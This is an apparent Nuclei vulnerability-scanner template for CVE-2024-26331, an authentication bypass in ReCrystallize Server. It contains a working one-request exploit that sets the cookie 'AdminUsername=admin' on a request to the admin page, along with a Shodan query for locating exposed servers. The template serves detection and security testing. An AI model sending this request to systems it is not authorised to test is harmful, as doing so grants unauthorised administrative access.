id: CVE-2024-26331

info:
  name: ReCrystallize Server - Authentication Bypass
  author: Carson Chan
  severity: high
  description: |
    This vulnerability allows an attacker to bypass authentication in the ReCrystallize Server application by manipulating the 'AdminUsername' cookie. This gives the attacker administrative access to the application's functionality, even when the default password has been changed.
  reference:
    - https://preview.sensepost.com/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/
    - https://sensepost.com/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/
    - https://www.recrystallize.com/merchant/ReCrystallize-Server-for-Crystal-Reports.htm
    - https://github.com/Ostorlab/KEV
  classification:
    epss-score: 0.67864
    epss-percentile: 0.98519
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"ReCrystallize"
  tags: cve,recrystallize,auth-bypass,cve2024,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/Admin/Admin.aspx"
    headers:
      Cookie: "AdminUsername=admin"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "ReCrystallize Server Administration"
          - "License Status:"
          - "System Info</a>"
        condition: and

      - type: status
        status:
          - 200
# digest: 490a00463044022038e782c9bf189402c2c8d25ff1b053a3f15927f394f91a9703ab81996783cecc02200430766fe840e8e17b26bc30aaafd7b0bc54584c7e55dbcd03cf608bf0263962:922c64590222798bb761d5b6d8e72950